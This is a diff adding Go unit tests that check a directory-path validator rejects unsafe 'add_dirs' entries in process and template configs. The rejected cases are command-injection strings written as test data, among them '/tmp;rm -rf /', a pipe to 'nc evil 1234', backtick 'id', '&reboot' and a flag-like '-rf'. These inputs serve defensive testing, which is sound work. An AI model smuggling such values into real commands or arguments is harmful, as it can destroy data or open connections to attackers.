@@ -1078,3 +1078,87 @@ func TestWritePromptFile(t *testing.T) {
 		}
 	})
 }
+
+func TestValidateAddDir(t *testing.T) {
+	tests := []struct {
+		name    string
+		dir     string
+		wantErr bool
+	}{
+		// Good paths — must not be rejected.
+		{"absolute path", "/Users/me/my-dir", false},
+		{"relative path", "subdir/nested", false},
+		{"tilde path", "~/code", false},
+		{"dotted path", "/opt/app.v2", false},
+		{"hyphenated name", "/var/log/my-app_1", false},
+		{"path with space", "/Users/me/My Docs", false},
+		{"unicode path", "/tmp/café", false},
+
+		// Empty / whitespace-only.
+		{"empty", "", true},
+		{"whitespace only", "   ", true},
+
+		// Leading dash — could be misread as a flag.
+		{"leading dash", "-rf", true},
+		{"leading double dash", "--evil", true},
+
+		// Each forbidden shell metacharacter.
+		{"semicolon", "/tmp;rm -rf /", true},
+		{"ampersand", "/tmp&reboot", true},
+		{"pipe", "/tmp|nc evil 1234", true},
+		{"dollar", "/tmp/$HOME", true},
+		{"backtick", "/tmp/`id`", true},
+		{"newline", "/tmp\nrm -rf /", true},
+		{"null byte", "/tmp\x00hidden", true},
+	}
+
+	for _, tt := range tests {
+		t.Run(tt.name, func(t *testing.T) {
+			err := ValidateAddDir(tt.dir)
+			if (err != nil) != tt.wantErr {
+				t.Errorf("ValidateAddDir(%q) error = %v, wantErr %v", tt.dir, err, tt.wantErr)
+			}
+		})
+	}
+}
+
+func TestValidateRejectsBadAddDirs(t *testing.T) {
+	t.Run("process add_dirs", func(t *testing.T) {
+		cfg := &Config{
+			Processes: map[string]ProcessConfig{
+				"p": {
+					AddDirs: []string{"/ok/path", "-rf", "/tmp;evil"},
+					Enabled: true,
+				},
+			},
+		}
+		err := cfg.Validate()
+		if err == nil {
+			t.Fatal("expected validation error")
+		}
+		msg := err.Error()
+		if !contains(msg, "processes.p.add_dirs[1]") {
+			t.Errorf("error = %q, want mention of processes.p.add_dirs[1]", msg)
+		}
+		if !contains(msg, "processes.p.add_dirs[2]") {
+			t.Errorf("error = %q, want mention of processes.p.add_dirs[2]", msg)
+		}
+	})
+
+	t.Run("template add_dirs", func(t *testing.T) {
+		cfg := &Config{
+			Templates: map[string]TemplateConfig{
+				"coding": {
+					AddDirs: []string{"/tmp/`id`"},
+				},
+			},
+		}
+		err := cfg.Validate()
+		if err == nil {
+			t.Fatal("expected validation error")
+		}
+		if !contains(err.Error(), "templates.coding.add_dirs[0]") {
+			t.Errorf("error = %q, want mention of templates.coding.add_dirs[0]", err.Error())
+		}
+	})
+}
